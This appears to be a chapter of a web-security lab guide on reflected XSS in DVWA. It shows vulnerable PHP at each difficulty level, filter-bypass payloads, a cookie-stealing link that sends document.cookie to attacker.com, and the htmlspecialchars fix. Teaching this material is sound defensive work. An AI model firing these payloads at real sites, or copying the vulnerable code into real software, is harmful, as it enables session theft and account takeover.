# 11 — XSS (Reflected)

## What the feature does
A "what's your name?" form that echoes the submitted `name` value back into the HTML response on the same page load.

---

## LOW

```php
echo 'Hello ' . $_GET[ 'name' ] . '';
```

**Exploitation:**
```
?name=<script>alert(document.cookie)</script>
```
Real attack (send victim a crafted link — this only fires when someone else clicks it, since it's *reflected*, not stored):
```
http://target/dvwa/vulnerabilities/xss_r/?name=<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

**Why it works:** User input is echoed back into the HTML response with zero encoding. The browser parses `<script>` tags in that response as executable code, indistinguishable from code the site's developer intended to serve.

---

## MEDIUM

```php
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
echo 'Hello ' . $name . '';
```

**Why it's still bypassable:** Denylisting one literal string (`<script>`) is defeated by:
```
<sCrIpT>alert(1)</sCrIpT>                 (case variation — str_replace is case-sensitive)
<scr<script>ipt>alert(1)</scr</script>ipt>  (nested tag trick: removing the inner <script> leaves the outer tag intact)
<img src=x onerror=alert(1)>              (entirely different tag/event, doesn't contain the string "<script>" at all)
<svg onload=alert(1)>
```

**Root issue:** Blocking one specific tag string does nothing against the dozens of other HTML elements/event handlers that execute JavaScript (`onerror`, `onload`, `onmouseover`, `<iframe>`, `javascript:` URIs, etc.).

---

## HIGH

```php
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
echo 'Hello ' . $name . '';
```

**Why it's still bypassable:** This regex specifically targets variations of the word "script" (including inserted characters between each letter) — but it's still a **denylist targeting one payload family**. It does nothing against non-script-tag vectors:
```
<img src=x onerror=alert(document.cookie)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<a href="javascript:alert(1)">click</a>
```

**Root issue:** No amount of denylisting specific tag names/keywords closes reflected XSS, because HTML/JS offers dozens of independent ways to achieve script execution — the fix has to be structural (encoding), not enumerative (blocking known-bad).

---

## IMPOSSIBLE

```php
$name = htmlspecialchars( $_GET[ 'name' ], ENT_QUOTES );
echo 'Hello ' . $name . '';
```

**Why this is actually secure:** `htmlspecialchars()` performs **context-appropriate output encoding** — it converts `<`, `>`, `&`, `"`, `'` into their HTML entity equivalents (`&lt;`, `&gt;`, etc.). The browser then renders these as literal, inert text characters rather than parsing them as markup. It doesn't matter *what* the attacker submits — `<script>`, `<svg onload=...>`, anything — because none of it can ever be interpreted as an HTML tag or attribute after encoding. This is the general, complete fix: **encode output for the context it's rendered into**, rather than trying to filter input for "bad" patterns.

---

## Root Cause Summary
> Reflected XSS exists whenever untrusted input is echoed into an HTML response without context-appropriate encoding. Denylisting specific tags/keywords is fundamentally incomplete — there are too many equivalent ways to trigger script execution in HTML. Always output-encode for the destination context (HTML body, HTML attribute, JS string, URL, CSS).

## Real-World Parallels
- Reflected XSS in search boxes, error pages, and URL-parameter-driven pages is one of the most commonly reported bug bounty findings
- OWASP Top 10: **A03:2021 – Injection**
- Frequently chained with CSRF/session-hijacking for account takeover in real disclosures

## Mitigation Checklist
- [ ] Context-aware output encoding at the point of rendering (`htmlspecialchars`, framework auto-escaping)
- [ ] Never build denylists of "dangerous" tags/keywords as the primary defense
- [ ] Set `HttpOnly` on session cookies (limits impact even if XSS occurs — JS can't read the cookie)
- [ ] Content Security Policy as defense-in-depth (Chapter 13)
- [ ] Use templating engines with auto-escaping enabled by default
